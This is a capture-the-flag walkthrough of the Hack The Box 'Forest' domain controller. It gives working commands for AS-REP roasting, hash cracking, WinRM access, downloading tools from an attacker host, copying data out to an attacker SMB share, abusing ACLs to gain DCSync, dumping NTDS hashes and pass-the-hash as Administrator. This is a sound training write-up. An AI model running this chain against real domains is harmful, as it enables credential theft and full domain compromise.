# Forest [HTB](https://app.hackthebox.com/machines/212)
![forest-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/forest-01.png)

## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 forest.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/ports-02.png)

We have quite a lot of ports open, let's run a version detection scan againts these ports:

```bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV forest.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/nmap-res-03.png)

![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/nmap-res-04.png)

We have the following:

+ A DNS server on port 53.
+ MS-Kerberos on port 88.
+ RPC endpoint mapper on ports 135 & 593.
+ NetBIOS on port 139.
+ LDAP services on ports 389, 636, 3268 & 3269.
+ An SMB server on port 445.
+ Kerberos Password Change service on port 464.
+ WinRM on port 5985.
+ Message Framing on port 9389.


From the results of the scan it's safe to assume that the target is a Domain Controller, as we see many Active Directory related services open on the target (LDAP, Kerberos, DNS, etc).

Based on the SMB scanning scripts, we know that the target is a 2016 Windows Server with a domain of `htb.local` and an FQDN of `forest.htb.local`. We also know that SMB message signing is enabled and requiered. 

Let's start with the SMB service and go on from there. 

### SMB Port 445

I start off testing null authintication with `smbclient` and `crackmapexec`, but to no avail:

![null-test-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/null-test-05.png)


Then I tried `enum4linux`, to run a more extensive scan with a null session:

```bash
enum4linux -a -u "" -p "" forest.htb
```

Which found some usernames in the domain:

![accounts-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/accounts-06.png)

It's worth saving these usernames into a file, one username per line, and [AS-REP-roasting](https://www.google.com/search?q=AS-REP+Roasting&oq=AS-REP+Roasting&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQRRg8MgYIAhAuGEDSAQcxOThqMGoxqAIAsAIA&sourceid=chrome&ie=UTF-8) them.

Let's do that! 


### AS-REP-Roasting

Tyipcally we would want to [kerberoasting] user accounts, but for that we need credentials. If we dont have credentials, but we have a list of valid domain usernames, the domain name, and the IP of the DC, we can AS-REP Roast the accounts and try to pull `AS-REP` hashes.

To do that we can use `impacket-GetNPUsers` as such:

```bash
impacket-GetNPUsers htb.local/ -dc-ip forest.htb -request -usersfile users.txt
```

This resulted in the following:

![kerberoast-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/kerberoast-07.png)


We got one! 

This means that the `svc-alfresco` user account doesn't have the Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH) set. As a result when anyone sends an `AS_REQ` request to the DC on behalf of `svc-alfresco`, they will receive an [AS-REP](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)) message back. 


This message contains a chunk of data encrypted with the original user key, derived from it's password. This message could be cracked offline. To crack the hash we first need to copy the whole hash into a file.


Then we can run `hashcat` on it:


```bash
hashcat -m 18200 -a 0 hash.txt rockyou.txt
```

![cracked-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/cracked-08.png)


So now we have credentials for a service account of `svc-alfresco : s3rvice`, and since the target has the `Win-RM` service open on port 5985, we can use `Evil-WinRM` to get access to the sytem:


```bash
evil-winrm -u svc-alfresco -p s3rvice -i forest.htb
```

![shell-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/shell-09.png)


## Privilege Escalation


After landing on the machine I start looking for easy wins, like the `Impersonate Privilege`, or stored credentials, but with no luck: 

![privs-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/privs-10.png)

I also had a look around the system, but I wasn't able to find any escalation paths. Instead, I decided to shift gears and take a look at Active Directory specific escalation paths. For this I used [BloodHound](https://github.com/BloodHoundAD/BloodHound)


The first step is to run a collector script on the target to gather information. I decided to use [SharpHound.exe](https://github.com/BloodHoundAD/SharpHound) as the collector, in order to avoid compatibility issues. 


After downloading the binary to my attack machine, I host the file using a python server:

```bash
python3 -m http.server 80
```

Then, I download the file from the target using:

```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.58/SharpHound.exe","C:\Users\svc-alfresco\sharp.exe")
```

Now that the file is on the target, I run it as such:

```powershell
./sharp.exe --CollectionMethods All
```

After the script has finished, we can see the output archive file:

![output-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/output-11.png)

Now we need to transfer the archive over to our attack machine. To do so I start an SMB server on my attack machine using:

```bash
impacket-smbserver -smb2support -username htb -password htb forest .
```

Then, I connect to this share from the target and copy the archive over:

```powershell
net use \\10.10.14.58\forest /u:htb htb 
copy 20231201012158_BloodHound.zip \\10.10.14.58\forest
```

![copy-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/cpy-12.png)

Now we should have the archive over on our attack machine:

![ll-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/ll-13.png)

The next step is to startup the BloodHound visulizer. To do so, I open two new terminal windows. On the first window I run `neo4j console` , and in the second window I run `bloodhound`.


After connecting to the Bloodhound interface, I import the zip archive we collected:

![bloodhound-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/bloodhound-14.png)


This is the `Shortest path to domain admin` query, though it's not really useful in this case. I tried using several different queries to get different escalation paths, but this didn't lead to anything super useful. 


Instead, I decided to focus on our compromised user `svc-alfresco`, and check he's `Object Outbound Control` entries. Meaning, which objects does our user has some form of control over:

![outbound-control-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/outbound-control-15.png)


Let me explain what we are seeing. 


The `svc-alfresco` user is a part of two main groups: `domain users` and `service accounts`, These are the most immediate connections to our user object in green. 
The later group, `service accounts` is a part of another group, the `privileged IT accounts` group, which itself is a part of another group, the `Account operators` group. 


This can be seen better in the below image:

![groups-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/groups-16.png)


So in essence, our user is a part of the `Account Operators` group. Why is this important? 


It's important because the `Account Operators` group has a clear escalation path seen here:

![path-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/path-17.png)


The highlighted blue path is the escalation path. Here is the breakdown:

+ The `Account Operators` group has `Generic All` rights over the `Exchange Windows Permissions` group.
+ The `Exchange Windows Permissions` group has `Write DACL` rights over the entire domain. 

With `Write DACL` rights over the entire doamin you can grant yourself whatever permissions you want. Primarly, we want to grant ourselfes the `DCSync` permission, which will allow us to extract user password hashes from the [NTDS.DIT](https://medium.com/@harikrishnanp006/understanding-ntds-dit-the-core-of-active-directory-faac54cc628a) database of the domain. 


To get into the `Exchange Windows Permissions` group we can abuse the `Generic All` rights we have as a member of the `Account Operator` group in order to add our user into the `Exchange Windows Permissions` group. From there we can grant our user the `DCSync` permission and get the Admin's password hash, let's make it happen! 


Before we begin making changes, we need to transfer [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) over to the target. This is the tool with which we will make the changes. I host the script using a python server, and download it to the target using `System.Net.WebClient`, (same as when we transferred SharpHound.exe). 


Here is the script on the target:

![view-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/view-18.png)

Let's import it to our current PowerShell session using:

```powershell
. .\PowerView.ps1
```

The next step is to add our user, `svc-alfresco` to the `Exchange Windows Permissions` group. To do this we can run the following:

```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco'
```

Let's verify that our user has been added to the group:

```powershell
Get-DomainGroupMember -Identity 'Exchange Windows Permissions'
```

![added-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/added-19.png)

Nice! 


Now that we are a part of the `Exchange Windows Permissions` group, we can grant our user the `DCSync` permission. To do this we first need to create a `PSCredential` object, this is necessary becasue even though we added ourselfes to the `Exchange Windows Permissions` group, this change isn't reflected in our current PowerShell session. Therefore we need to pass in our credentials (via a PSCredential object) when we give ourselfes the `DCSync` right.


To create the `PSCredential` object we can run the following:

```powershell
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-aflresco', $SecPassword)
```

Now we can add the `DCSync` rights to our user `svc-alfresco` using:

```powershell
Add-DomainObjectACL -Credential $Cred -TargetIdentity htb.local -PrincipalIdentity "svc-alfresco" -Rights DCSync
```

![dcsync-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/dcsync-20.png)


Now that our user has the `DCSync` rights, we can use the `mimikatz dcsync` function to dcsync the password of arbitrary principals on the domain. 

I Tried to do that, I had issues using `Mimikatz`, I also tried `Invoke-mimikatz.ps1`, but to no avail. 


Instead, we can use `impacket-secretsdump` to dump out the user password hashes:

```bash
impacket-secretsdump -just-dc svc-alfresco:s3rvice@forest.htb
```

![ntds-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/ntds-21.png)

From here we can use the Adminstrator's password hash with `impacket-psexec` to get a shell as `NT Auhtority`:

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Administrator@forest.htb
```

![root-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Forest/img/root-22.png)
